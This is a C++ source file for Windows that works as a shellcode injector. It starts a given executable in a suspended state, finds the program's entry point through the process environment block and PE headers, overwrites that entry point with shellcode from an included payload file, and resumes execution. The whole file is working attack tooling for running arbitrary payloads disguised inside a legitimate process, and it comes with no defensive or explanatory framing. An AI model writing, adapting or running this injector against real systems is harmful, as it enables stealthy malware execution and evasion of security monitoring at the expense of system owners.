/**
* Creates a suspended process of the supplied binary path and replaces its entry point with shellcode before resuming its execution.
* Supports 32- and 64 Bit applications.
*/

#include <Windows.h>
#include <winternl.h>
#include <cstdint>
#include <cstdio>

#include "../payload/shellcode.hpp"


int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: *.exe executablePath\n");
		return 1;
	}

	LPSTR binaryPath = argv[1];

	STARTUPINFOA startupInfo = {};
	PROCESS_INFORMATION processInformation = {};
	PROCESS_BASIC_INFORMATION processBasicInformation = {};
	ULONG returnLength = 0;
	
	// create the process in a suspended state
	if (!CreateProcessA(0, binaryPath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &startupInfo, &processInformation))
	{
		printf("[Error] %d - Failed to create process %s\n", GetLastError(), binaryPath);
		return 1;
	}

	printf("[Info] - Created process %d in suspended state\n", processInformation.dwProcessId);

	// get process basic information
	NTSTATUS error = NtQueryInformationProcess(processInformation.hProcess, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (error)
	{
		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
		return 1;
	}

	// read base address of process
	int64_t pebOffset = (int64_t)processBasicInformation.PebBaseAddress + 2 * sizeof(void*);
	LPVOID processBasesAddress = 0;
	if (!ReadProcessMemory(processInformation.hProcess, (LPCVOID)pebOffset, &processBasesAddress, sizeof(void*), NULL))
	{
		printf("[Error] %d - Failed to read PEB offset\n", GetLastError());
		return 1;
	}

	// read PE headers
	const int PE_BUFFER_SIZE = 4096;
	int8_t peBuffer[PE_BUFFER_SIZE] = {};
	if (!ReadProcessMemory(processInformation.hProcess, processBasesAddress, peBuffer, PE_BUFFER_SIZE, NULL))
	{
		printf("[Error] %d - Failed to read PE header\n", GetLastError());
		return 1;
	}

	printf("[Info] - Read PE header at %p\n", processBasesAddress);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(peBuffer + dosHeader->e_lfanew);
	LPVOID entryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (int64_t)processBasesAddress);

	// write the shellcode to the entry point
	if (!WriteProcessMemory(processInformation.hProcess, entryPoint, shellcode, sizeof(shellcode)-1, NULL))
	{
		printf("[Error] %d - Failed to write shellcode to entry point\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote shellcode to entrypoint at %p\n", entryPoint);

	// resume the thread of the suspended process
	if (ResumeThread(processInformation.hThread) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Resumed thread %p\n", processInformation.hThread);

	return 0;
}